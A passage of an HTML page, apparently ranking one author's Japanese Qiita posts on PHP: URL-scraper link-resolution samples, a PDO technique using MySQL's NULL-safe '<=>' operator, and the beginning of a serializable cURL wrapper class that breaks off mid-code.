<span class="nb">print_r</span><span class="p">(</span><span class="nx">UrlScraper</span><span class="o">::</span><span class="na">parseLinks</span><span class="p">(</span><span class="nv">$html</span><span class="p">,</span> <span class="s1">'/foo/bar'</span><span class="p">));</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">結果</span></div>
<div class="highlight"><pre><span></span>
Array
(
    [0] =&gt; Array
        (
            [href] =&gt; /foo/bar?q=php
            [text] =&gt; ?q=php
        )

    [1] =&gt; Array
        (
            [href] =&gt; /foo/?q=php
            [text] =&gt; ./?q=php
        )

    [2] =&gt; Array
        (
            [href] =&gt; /?q=php
            [text] =&gt; ../?q=php
        )

    [3] =&gt; Array
        (
            [href] =&gt; /?q=php
            [text] =&gt; /?q=php
        )

    [4] =&gt; Array
        (
            [href] =&gt; /foo/#php
            [text] =&gt; ./#php
        )

    [5] =&gt; Array
        (
            [href] =&gt; /#php
            [text] =&gt; ../#php
        )

    [6] =&gt; Array
        (
            [href] =&gt; /#php
            [text] =&gt; /#php
        )

)
</pre></div>
</div>

<h3>
<span id="サンプル5-ベースにディレクトリへの絶対パスを指定" class="fragment"></span><a href="#%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB5-%E3%83%99%E3%83%BC%E3%82%B9%E3%81%AB%E3%83%87%E3%82%A3%E3%83%AC%E3%82%AF%E3%83%88%E3%83%AA%E3%81%B8%E3%81%AE%E7%B5%B6%E5%AF%BE%E3%83%91%E3%82%B9%E3%82%92%E6%8C%87%E5%AE%9A"><i class="fa fa-link"></i></a>サンプル5: ベースにディレクトリへの絶対パスを指定</h3>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">コード</span></div>
<div class="highlight"><pre><span></span><span class="nv">$html</span> <span class="o">=</span> <span class="s">&lt;&lt;&lt;'</span><span class="dl">EOD</span><span class="s">'</span>
<span class="s">&lt;a href="?q=php"&gt;?q=php&lt;/a&gt;</span>
<span class="s">&lt;a href="./?q=php"&gt;./?q=php&lt;/a&gt;</span>
<span class="s">&lt;a href="../?q=php"&gt;../?q=php&lt;/a&gt;</span>
<span class="s">&lt;a href="/?q=php"&gt;/?q=php&lt;/a&gt;</span>
<span class="s">&lt;a href="#php"&gt;#php&lt;/a&gt;</span>
<span class="s">&lt;a href="./#php"&gt;./#php&lt;/a&gt;</span>
<span class="s">&lt;a href="../#php"&gt;../#php&lt;/a&gt;</span>
<span class="s">&lt;a href="/#php"&gt;/#php&lt;/a&gt;</span>
<span class="dl">EOD</span><span class="p">;</span>

<span class="nb">print_r</span><span class="p">(</span><span class="nx">UrlScraper</span><span class="o">::</span><span class="na">parseLinks</span><span class="p">(</span><span class="nv">$html</span><span class="p">,</span> <span class="s1">'/foo/bar/'</span><span class="p">));</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">結果</span></div>
<div class="highlight"><pre><span></span>Array
(
    [0] =&gt; Array
        (
            [href] =&gt; /foo/bar/?q=php
            [text] =&gt; ?q=php
        )

    [1] =&gt; Array
        (
            [href] =&gt; /foo/bar/?q=php
            [text] =&gt; ./?q=php
        )

    [2] =&gt; Array
        (
            [href] =&gt; /foo/?q=php
            [text] =&gt; ../?q=php
        )

    [3] =&gt; Array
        (
            [href] =&gt; /?q=php
            [text] =&gt; /?q=php
        )

    [4] =&gt; Array
        (
            [href] =&gt; /foo/#php
            [text] =&gt; ../#php
        )

    [5] =&gt; Array
        (
            [href] =&gt; /#php
            [text] =&gt; /#php
        )

)
</pre></div>
</div>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />29位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>42</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/cb7ca19284afc4e2969d"> プレースホルダで「= ?」と「IS NULL」に同時に対応する方法</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-12-20 04:15:42</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[MySQL]</b> <b>[PDO]</b> <b>[データベース]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="こんなときあなたならどうする" class="fragment"></span><a href="#%E3%81%93%E3%82%93%E3%81%AA%E3%81%A8%E3%81%8D%E3%81%82%E3%81%AA%E3%81%9F%E3%81%AA%E3%82%89%E3%81%A9%E3%81%86%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>こんなとき、あなたならどうする？</h1>

<p>プレースホルダにバインドされる値が  <strong>文字列</strong> 、 <strong>NULL</strong> の2通りあって、どちらにも対応してSQLを発行しなければならないとき。</p>

<p>これらのケースは動作します。</p>

<div class="code-frame" data-lang="sql"><div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">test</span> <span class="k">WHERE</span> <span class="n">hoge</span> <span class="o">=</span> <span class="s1">'yeah'</span>
</pre></div></div>

<div class="code-frame" data-lang="sql"><div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">test</span> <span class="k">WHERE</span> <span class="n">hoge</span> <span class="k">IS</span> <span class="k">NULL</span>
</pre></div></div>

<p>ところがこれらは動作しません。</p>

<div class="code-frame" data-lang="sql"><div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">test</span> <span class="k">WHERE</span> <span class="n">hoge</span> <span class="k">IS</span> <span class="s1">'yeah'</span>
</pre></div></div>

<div class="code-frame" data-lang="sql"><div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">test</span> <span class="k">WHERE</span> <span class="n">hoge</span> <span class="o">=</span> <span class="k">NULL</span>
</pre></div></div>

<p>さてどうしましょう？</p>

<h2>
<span id="解決策1" class="fragment"></span><a href="#%E8%A7%A3%E6%B1%BA%E7%AD%961"><i class="fa fa-link"></i></a>解決策1</h2>

<p>プリペアドステートメントの生成時点で場合分けすればOK。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$array</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'yeah'</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
<span class="nv">$value</span> <span class="o">=</span> <span class="nv">$array</span><span class="p">[</span><span class="nb">array_rand</span><span class="p">(</span><span class="nv">$array</span><span class="p">)];</span>

<span class="nv">$holder</span> <span class="o">=</span> <span class="nv">$value</span> <span class="o">===</span> <span class="k">null</span> <span class="o">?</span> <span class="s1">'IS NULL'</span> <span class="o">:</span> <span class="s1">'= ?'</span><span class="p">;</span>
<span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">"SELECT * FROM test WHERE hoge </span><span class="si">{</span><span class="nv">$holder</span><span class="si">}</span><span class="s2">"</span><span class="p">);</span>
<span class="nv">$value</span> <span class="o">===</span> <span class="k">null</span> <span class="o">?</span> <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">()</span> <span class="o">:</span> <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="nv">$value</span><span class="p">));</span>
</pre></div></div>

<h2>
<span id="解決策2" class="fragment"></span><a href="#%E8%A7%A3%E6%B1%BA%E7%AD%962"><i class="fa fa-link"></i></a>解決策2</h2>

<p><strong>spaceship</strong> (宇宙船) っていうカッコイイ名前の演算子があるようです。</p>

<p><a href="https://camo.qiitausercontent.com/6f2bfd6549ae48eea088a19365141c0d8826a796/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f35653464336335652d353030372d346537342d303036332d6436363939653161333761632e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/6f2bfd6549ae48eea088a19365141c0d8826a796/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f35653464336335652d353030372d346537342d303036332d6436363939653161333761632e706e67" alt="ss (2013-12-20 at 04.01.19).png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/5e4d3c5e-5007-4e74-0063-d6699e1a37ac.png"></a></p>

<p><strong><a href="http://dev.mysql.com/doc/refman/5.0/en/comparison-operators.html" rel="nofollow noopener" target="_blank">MySQLマニュアル</a></strong> を見てみると・・・</p>

<p><a href="https://camo.qiitausercontent.com/7afd933a96fef5565156dc1b950793afbadb6c27/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f34356561303564342d313866302d313063612d363636372d3465643834336364323137642e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/7afd933a96fef5565156dc1b950793afbadb6c27/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f34356561303564342d313866302d313063612d363636372d3465643834336364323137642e706e67" alt="ss (2013-12-20 at 04.00.20).png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/45ea05d4-18f0-10ca-6667-4ed843cd217d.png"></a></p>

<p><strong>NULL-Safe</strong> だって！これはもう使うしかない！</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$array</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'yeah'</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
<span class="nv">$value</span> <span class="o">=</span> <span class="nv">$array</span><span class="p">[</span><span class="nb">array_rand</span><span class="p">(</span><span class="nv">$array</span><span class="p">)];</span>

<span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">"SELECT * FROM test WHERE hoge &lt;=&gt; ?"</span><span class="p">);</span>
<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bindValue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nv">$value</span><span class="p">,</span> <span class="nv">$value</span> <span class="o">===</span> <span class="k">null</span> <span class="o">?</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_NULL</span> <span class="o">:</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_STR</span><span class="p">);</span>
<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
</pre></div></div>

<p>これいいですね・・・！</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />30位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>39</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/c65fb4ec4cef80909a47">シリアライズ可能なcURLのラッパークラス</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-12-06 01:26:15</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[curl]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p><strong>Cookie</strong> がシリアライズ可能なcURLのラッパークラスがあんまり無いような気がしたので作ってみました。</p>

<h1>
<span id="source" class="fragment"></span><a href="#source"><i class="fa fa-link"></i></a>Source</h1>

<p><strong>BSD2条項ライセンス</strong> でお願いします。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="sd">/**</span>
<span class="sd"> * cURL</span>
<span class="sd"> * </span>
<span class="sd"> * @author CertaiN</span>
<span class="sd"> * @github https://github.com/Certainist/cURL</span>
<span class="sd"> * @license BSD 2-Clause</span>
<span class="sd"> */</span>
<span class="k">class</span> <span class="nc">cURL</span> <span class="k">implements</span> <span class="nx">Serializable</span> <span class="p">{</span>

    <span class="sd">/**</span>
<span class="sd">     * Default User-Agent.</span>
<span class="sd">     * </span>
<span class="sd">     * @static</span>
<span class="sd">     * @access public</span>
<span class="sd">     */</span>
    <span class="k">public</span> <span class="k">static</span> <span class="nv">$defaultUserAgent</span> <span class="o">=</span> <span class="s1">'Chrome'</span><span class="p">;</span>

    <span class="k">private</span> <span class="nv">$ch</span><span class="p">;</span>
    <span class="k">private</span> <span class="nv">$fp</span><span class="p">;</span>
    <span class="k">private</span> <span class="nv">$userAgent</span><span class="p">;</span>
    <span class="k">private</span> <span class="nv">$cookie</span><span class="p">;</span>

    <span class="sd">/**</span>
<span class="sd">     * You have to call parent::__construct() on your extended method.</span>
<span class="sd">     * </span>
<span class="sd">     * @magic</span>
<span class="sd">     * @access public</span>
<span class="sd">     * @param string [$user_agent = null]</span>
<span class="sd">     */</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$user_agent</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$list</span> <span class="o">=</span> <span class="k">static</span><span class="o">::</span><span class="na">getUserAgents</span><span class="p">();</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">func_num_args</span><span class="p">())</span> <span class="p">{</span>
            <span class="nv">$user_agent</span> <span class="o">=</span> <span class="k">static</span><span class="o">::</span><span class="nv">$defaultUserAgent</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$user_agent</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">InvalidArgumentException</span><span class="p">(</span><span class="s1">'User-Agent value type must be string.'</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$list</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">DomainException</span><span class="p">(</span><span class="s1">'static::getUserAgents() must return 1 dimentional assoc.'</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="nv">$user_agent</span><span class="p">,</span> <span class="nv">$list</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">InvalidArgumentException</span><span class="p">(</span><span class="s1">'Unknown User-Agent.'</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$list</span><span class="p">[</span><span class="nv">$user_agent</span><span class="p">]))</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">DomainException</span><span class="p">(</span><span class="s1">'static::getUserAgents() return array must contain string values.'</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">userAgent</span> <span class="o">=</span> <span class="nv">$list</span><span class="p">[</span><span class="nv">$user_agent</span><span class="p">];</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">init</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="sd">/**</span>
<span class="sd">     * For GET requests.</span>
<span class="sd">     * </span>
<span class="sd">     * @access public</span>
<span class="sd">     * @param string $url</span>
<span class="sd">     * @param mixed [&amp;$info = null] Set result of curl_getinfo().</span>
<span class="sd">     * @return string Response body.</span>
<span class="sd">     */</span>
    <span class="k">public</span> <span class="k">function</span> <span class="nf">get</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="o">&amp;</span><span class="nv">$info</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$url</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">InvalidArgumentException</span><span class="p">(</span><span class="s1">'URL value type must be string.'</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ch</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">BadMethodCallException</span><span class="p">(</span><span class="s1">'cURL resource is not initialized'</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nb">curl_setopt_array</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ch</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
            <span class="nx">CURLOPT_URL</span> <span class="o">=&gt;</span> <span class="nv">$url</span><span class="p">,</span>
            <span class="nx">CURLOPT_HTTPGET</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
        <span class="p">));</span>
        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">exec</span><span class="p">(</span><span class="nv">$info</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="sd">/**</span>
<span class="sd">     * For POST requests.</span>
<span class="sd">     * </span>
<span class="sd">     * @access public</span>
<span class="sd">     * @param string $url</span>
<span class="sd">     * @param mixed $params Query string or associative array.</span>
<span class="sd">     * @param mixed [&amp;$info = null] Set result of curl_getinfo().</span>
<span class="sd">     * @return string Response body.</span>
<span class="sd">     */</span>
    <span class="k">public</span> <span class="k">function</span> <span class="nf">post</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="nv">$params</span><span class="p">,</span> <span class="o">&amp;</span><span class="nv">$info</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$url</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">InvalidArgumentException</span><span class="p">(</span><span class="s1">'URL value type must be string.'</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ch</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">BadMethodCallException</span><span class="p">(</span><span class="s1">'cURL resource is not initialized'</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nb">curl_setopt_array</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ch</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
            <span class="nx">CURLOPT_URL</span> <span class="o">=&gt;</span> <span class="nv">$url</span><span class="p">,</span>
            <span class="nx">CURLOPT_POST</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
            <span class="nx">CURLOPT_POSTFIELDS</span> <span class="o">=&gt;</span> <span class="nv">$params</span><span class="p">,</span>
        <span class="p">));</span>
        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">exec</span><span class="p">(</span><span class="nv">$info</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="sd">/**</span>
<span class="sd">     * Clear cookies.</span>
<span class="sd">     * </span>
<span class="sd">     * @access public</span>
<span class="sd">     */</span>
    <span class="k">public</span> <span class="k">function</span> <span class="nf">clearCookies</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ch</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">BadMethodCallException</span><span class="p">(</span><span class="s1">'cURL resource is not initialized'</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nb">ftruncate</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fp</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="sd">/**</span>
<span class="sd">     * Return the list of User-Agents.</span>
<span class="sd">     * You can extend this method.</span>
<span class="sd">     * </span>
<span class="sd">     * @static</span>
<span class="sd">     * @access protected</span>
<span class="sd">     * @return array Associative array.</span>
<span class="sd">     */</span>
    <span class="k">protected</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">getUserAgents</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">return</span> <span class="k">array</span><span class="p">(</span>
            <span class="s1">'Chrome'</span> <span class="o">=&gt;</span>
                <span class="s1">'Mozilla/5.0 (Windows NT 6.1) '</span> <span class="o">.</span>
                <span class="s1">'AppleWebKit/537.36 (KHTML, like Gecko) '</span> <span class="o">.</span>
                <span class="s1">'Chrome/28.0.1500.63 Safari/537.36'</span>
            <span class="p">,</span>
            <span class="s1">'Firefox'</span> <span class="o">=&gt;</span>
                <span class="s1">'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:9.0.1) '</span> <span class="o">.</span>
                <span class="s1">'Gecko/20100101 Firefox/9.0.1'</span>
            <span class="p">,</span>
            <span class="s1">'Android'</span> <span class="o">=&gt;</span>
                <span class="s1">'Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03S) '</span> <span class="o">.</span>
                <span class="s1">'AppleWebKit/535.19 (KHTML, like Gecko) '</span> <span class="o">.</span>
                <span class="s1">'Chrome/18.0.1025.166 Safari/535.19'</span>
            <span class="p">,</span>
            <span class="s1">'iOS'</span> <span class="o">=&gt;</span>
                <span class="s1">'Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) '</span> <span class="o">.</span>
                <span class="s1">'AppleWebKit/536.26 (KHTML, like Gecko) '</span> <span class="o">.</span>
                <span class="s1">'Version/6.0 Mobile/10A403 Safari/8536.25'</span>
            <span class="p">,</span>
            <span class="s1">'Windows Phone'</span> <span class="o">=&gt;</span>
                <span class="s1">'Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; '</span> <span class="o">.</span>
                <span class="s1">'Trident/5.0; IEMobile/9.0; '</span> <span class="o">.</span>
                <span class="s1">'FujitsuToshibaMobileCommun; IS12T; KDDI)'</span>
            <span class="p">,</span>
            <span class="s1">'Internet Explorer'</span> <span class="o">=&gt;</span>
                <span class="s1">'Mozilla/5.0 (Windows NT 6.3; WOW64; '</span> <span class="o">.</span> 
                <span class="s1">'Trident/7.0; Touch; rv:11.0) like Gecko'</span>
            <span class="p">,</span>
        <span class="p">);</span>
    <span class="p">}</span>

    <span class="sd">/**</span>
<span class="sd">     * Serialize your own properties.</span>
<span class="sd">     * You can extend this method.</span>
<span class="sd">     * </span>
<span class="sd">     * @access protected</span>
<span class="sd">     * @return mixed</span>
<span class="sd">     */</span>
    <span class="k">protected</span> <span class="k">function</span> <span class="nf">userSerialize</span><span class="p">()</span> <span class="p">{</span> <span class="k">return</span> <span class="k">null</span><span class="p">;</span> <span class="p">}</span>

    <span class="sd">/**</span>
<span class="sd">     * Unserialize your own properties.</span>
<span class="sd">     * You can extend this method.</span>
<span class="sd">     * </span>
<span class="sd">     * @param anything $data</span>
<span class="sd">     * @access protected</span>
<span class="sd">     * @return mixed</span>
<span class="sd">     */</span>
    <span class="k">protected</span> <span class="k">function</span> <span class="nf">userUnserialize</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span> <span class="p">}</span>

    <span class="sd">/**</span>
<span class="sd">     * You have to call parent::__destruct() on your extended method.</span>
<span class="sd">     * </span>
<span class="sd">     * @magic</span>
<span class="sd">     * @access public</span>
<span class="sd">     */</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ch</span><span class="p">))</span> <span class="p">{</span>
            <span class="nb">curl_close</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ch</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fp</span><span class="p">))</span> <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cookie</span> <span class="o">=</span> <span class="nb">stream_get_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fp</span><span class="p">);</span>
            <span class="nb">fclose</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fp</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">final</span> <span class="k">public</span> <span class="k">function</span> <span class="nf">serialize</span><span class="p">()</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">__destruct</span><span class="p">();</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">init</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cookie</span><span class="p">);</span>
        <span class="k">return</span> <span class="nb">serialize</span><span class="p">(</span><span class="k">array</span><span class="p">(</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">userAgent</span><span class="p">,</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cookie</span><span class="p">,</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">userSerialize</span><span class="p">(),</span>
        <span class="p">));</span>
    <span class="p">}</span>

    <span class="k">final</span> <span class="k">public</span> <span class="k">function</span> <span class="nf">unserialize</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span>
            <span class="o">!</span><span class="nv">$data</span> <span class="o">=</span> <span class="o">@</span><span class="nb">unserialize</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="k">or</span>
            <span class="o">!</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nv">$data</span><span class="p">)</span> <span class="k">or</span>
            <span class="o">!</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nv">$data</span><span class="p">)</span> <span class="k">or</span>
            <span class="o">!</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="nv">$data</span><span class="p">)</span> <span class="k">or</span>
            <span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="k">static</span><span class="o">::</span><span class="na">getUserAgents</span><span class="p">(),</span> <span class="k">true</span><span class="p">)</span> <span class="k">or</span>
            <span class="o">!</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
        <span class="p">)</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">UnexpectedValueException</span><span class="p">(</span><span class="s1">'Invalid serial'</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">userAgent</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">init</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">userUnserialize</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="nf">exec</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$info</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ch</span><span class="p">);</span>
        <span class="nv">$info</span> <span class="o">=</span> <span class="nb">curl_getinfo</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ch</span><span class="p">);</span>
        <span class="k">return</span> <span class="nv">$ret</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="nf">init</span><span class="p">(</span><span class="nv">$data</span> <span class="o">=</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fp</span> <span class="o">=</span> <span class="nb">tmpfile</span><span class="p">();</span>
